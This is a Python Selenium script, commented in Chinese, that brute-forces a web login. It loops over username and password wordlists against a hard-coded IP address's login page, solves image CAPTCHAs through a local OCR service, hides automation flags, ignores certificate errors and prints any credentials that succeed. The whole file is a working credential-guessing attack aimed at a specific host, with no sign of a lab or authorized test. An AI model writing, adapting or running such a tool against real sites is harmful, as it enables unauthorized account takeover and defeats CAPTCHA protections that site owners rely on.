
import time
from selenium import webdriver
from selenium.webdriver.common.by import By

def init_browser_driver(browser_type, browser_options):
    """
    初始化浏览器驱动
    """
    if browser_type == 'chrome':
        # 创建实例
        browser = webdriver.Chrome(browser_options)
    elif browser_type == 'firefox':
        # 创建实例
        browser = webdriver.Firefox(browser_options)
    else:
        print("Unsupported browser type. Please use 'chrome' or 'firefox'")
    # 最大化窗口
    # browser.maximize_window()
    # 设置隐式等待时间
    browser.implicitly_wait(5)
    return browser


def init_browser_options(browser_type):
    """
    初始化浏览器启动参数
    """
    if browser_type == 'chrome':
        browser_options = webdriver.ChromeOptions()
        # 隐身模式
        # browser_options.add_argument("--incognito")
        # 禁用缓存
        browser_options.add_argument("--disable-cache")
        # 禁用插件
        browser_options.add_argument("--disable-plugins")
        # 禁用通知
        browser_options.add_argument("--disable-notifications")
        # 禁用组件更新
        browser_options.add_argument("--disable-component-update")
        # 忽略证书错误
        browser_options.add_argument("--ignore-certificate-errors")
        # 禁用浏览器默认的自动化扩展
        browser_options.add_experimental_option("useAutomationExtension", False)
        # 禁用浏览器的信息和日志记录
        browser_options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])

        return browser_options

    elif browser_type == 'firefox':
        browser_options = webdriver.FirefoxOptions()
        # 禁用自动更新
        browser_options.set_preference("app.update.auto", False)
        browser_options.set_preference("app.update.enabled", False)
        # 忽略证书错误
        browser_options.set_preference("browser.ssl_override_behavior", 1)
        # 禁用浏览器通知
        browser_options.set_preference("dom.webnotifications.enabled", False)
        # 禁用窗口日志
        browser_options.set_preference("browser.dom.window.dump.enabled", False)
        # 禁用控制台日志
        browser_options.set_preference("browser.console.showInPanel", False)
        # 禁用首次运行数据报告
        browser_options.set_preference("toolkit.telemetry.reportingpolicy.firstRun", False)
        # 设置 User-Agent
        browser_options.set_preference("general.useragent.override", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
        # 禁用磁盘缓存、禁用内存缓存、禁用离线缓存、禁用 HTTP 缓存
        browser_options.set_preference("browser.cache.disk.enable", False)
        browser_options.set_preference("browser.cache.memory.enable", False)
        browser_options.set_preference("browser.cache.offline.enable", False)
        browser_options.set_preference("network.http.use-cache", False)

        return browser_options
    else:
        print("Unsupported browser type. Please use 'chrome' or 'firefox'")


def init_browser_action(browser):
    """
    初始化浏览器操作函数
    """
    def browser_action(location, action_key, keys=None):
        # 元素的定位方式和定位值
        location = (By.XPATH, location)
        try:
            if action_key == "查找":
                browser.find_element(*location)
                return True
            elif action_key == "点击":
                browser.find_element(*location).click()
                time.sleep(1)
            elif action_key == "双击":
                element = browser.find_element(*location)
                actions = webdriver.ActionChains(browser)
                actions.double_click(element).perform()
                time.sleep(1)
            elif action_key == "填写":
                element = browser.find_element(*location)
                element.clear()
                element.send_keys(keys)
            elif action_key == "获取":
                text = browser.find_element(*location).text
                return text
            elif action_key == "获取图片数据":
                png = browser.find_element(*location).screenshot_as_png
                return png
            elif action_key == "进入框架":
                iframe = browser.find_element(*location)
                browser.switch_to.frame(iframe)
            elif action_key == "删除元素":
                element = browser.find_element(*location)
                browser.execute_script("""
                    var element = arguments[0];
                    element.parentNode.removeChild(element);
                """, element)
        except:
            pass
    return browser_action


""" 
初始化浏览器配置
"""
# 浏览器类型
# browser_type = 'firefox'
browser_type = 'chrome'
# 初始化浏览器参数
chrome_options = init_browser_options(browser_type)
# 初始化浏览器驱动
browser = init_browser_driver(browser_type, chrome_options)
# 初始化浏览器操作
browser_action = init_browser_action(browser)


import json
import base64
import requests


def load_auth_key(path='auth_key.json'):
    """
    加载授权 key，只加载一次。
    """
    try:
        with open(path, 'r', encoding='utf-8') as file:
            json_data = json.load(file)
            return json_data.get("key")
    except Exception as e:
        raise RuntimeError(f"读取授权文件失败: {e}")


# 全局只加载一次
AUTH_KEY = load_auth_key()


def ocr_png_code(data: bytes) -> str:
    hosts = [
        "http://127.0.0.1:58888",
    ]

    base64_data = base64.b64encode(data).decode("utf-8")

    for host in hosts:
        api_url = f"{host}/get_captcha"
        try:
            req = requests.post(api_url, data=base64_data, headers={"Authorization": f"Basic {AUTH_KEY}"}, timeout=2)
            if req.status_code == 200:
                return req.text
        except Exception:
            continue

    raise RuntimeError("OCR 服务请求失败！")

def boom_passwd(username, password):
    # 等待页面打开
    while not browser_action(xpath_input_username, "查找"):
        time.sleep(1)
        
    # 账户
    browser_action(xpath_input_username, "填写", username)
    # 密码
    browser_action(xpath_input_password, "填写", password)

    
    # 判断是否需要验证码
    if xpath_png and xpath_input_code:
        # 点击验证码输入框
        browser_action(xpath_input_code, "点击")
        while True:
            # 找到图片元素，获取 PNG 数据
            data = browser_action(xpath_png, "获取图片数据")
            # 获取验证码
            code_text = ocr_png_code(data)
            if not code_text or len(code_text)!=4:
                browser_action(xpath_png, "点击")
                continue
            break

        # 输入验证码
        browser_action(xpath_input_code, "填写", code_text)
        # 登录
        browser_action(xpath_login_button, "点击")
    # 登录
    browser_action(xpath_login_button, "点击")

    # 判断是否登录成功
    if browser_action(xpath_login_error, "查找"):
        # browser_action(xpath_login_error2, "删除元素")
        # browser_action(xpath_login_error, "删除元素")
        print(f"[-] {username} | {password}")
    else:
        print(f"[+] 登录成功 {username} | {password}")
        return True

def main():
    # 读取用户名和密码文本，生成列表
    with open(username_file, encoding="utf-8", mode="r") as f:
        usernames = f.read().splitlines()
    with open(password_file, encoding="utf-8", mode="r") as f:
        passwords = f.read().splitlines()

    for password in passwords:
        for username in usernames:
            if boom_passwd(username, password):
                return





""" 
xpath定位元素 
"""
xpath_input_username = '//*[@id="app"]/div/div/div[3]/div[2]/form/div[1]/div/div/input'
xpath_input_password = '//*[@id="app"]/div/div/div[3]/div[2]/form/div[2]/div/div/input'
xpath_login_button = '//*[@id="app"]/div/div/div[3]/div[2]/form/button'
xpath_login_error = '/html/body/div[2]'
# xpath_login_error2 = '/html/body/div[4]'

# 验证码图片
xpath_png = None
# 验证码输入框
xpath_input_code = None

url = "http://39.162.0.43:28819/login"

username_file = "username.txt"
password_file = "password.txt"
# password_file = "password_top10.txt"

if __name__ == "__main__":
    # 打开网站
    browser.get(url)
    main()
    